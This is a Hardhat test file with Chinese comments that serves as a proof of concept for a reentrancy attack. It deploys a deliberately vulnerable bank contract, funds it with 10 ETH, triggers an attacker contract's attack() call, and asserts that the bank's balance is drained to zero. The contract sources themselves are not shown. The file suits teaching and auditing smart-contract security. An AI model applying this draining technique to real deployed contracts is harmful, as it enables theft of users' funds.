/**
 * 重入攻击 POC (Proof of Concept)
 * 运行环境：Hardhat / Node.js + ethers.js
 *
 * 复现步骤：
 *   1. 部署 VulnerableBank
 *   2. 正常用户存入 10 ETH
 *   3. 攻击者部署 ReentrancyAttack，存入 1 ETH 并调用 attack()
 *   4. 观察银行合约余额被全部抽干
 */

const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Reentrancy Attack POC", function () {
  let bank, attack, owner, attacker, user;

  before(async function () {
    [owner, attacker, user] = await ethers.getSigners();

    const Bank = await ethers.getContractFactory("VulnerableBank");
    bank = await Bank.deploy();
    await bank.deployed();

    const Attack = await ethers.getContractFactory("ReentrancyAttack");
    attack = await Attack.connect(attacker).deploy(bank.address);
    await attack.deployed();
  });

  it("正常用户存款后银行合约有余额", async function () {
    await bank.connect(user).deposit({ value: ethers.utils.parseEther("10") });
    expect(await bank.getBalance()).to.equal(ethers.utils.parseEther("10"));
  });

  it("攻击者通过重入抽干银行合约全部资金", async function () {
    const bankBefore = await bank.getBalance();
    console.log("攻击前银行余额:", ethers.utils.formatEther(bankBefore), "ETH");

    // 攻击者存入 1 ETH 并发起攻击
    await attack.connect(attacker).attack({ value: ethers.utils.parseEther("1") });

    const bankAfter = await bank.getBalance();
    const attackerBalance = await attack.getBalance();
    console.log("攻击后银行余额:", ethers.utils.formatEther(bankAfter), "ETH");
    console.log("攻击合约余额:", ethers.utils.formatEther(attackerBalance), "ETH");

    // 银行被抽干
    expect(bankAfter).to.equal(0);
  });
});
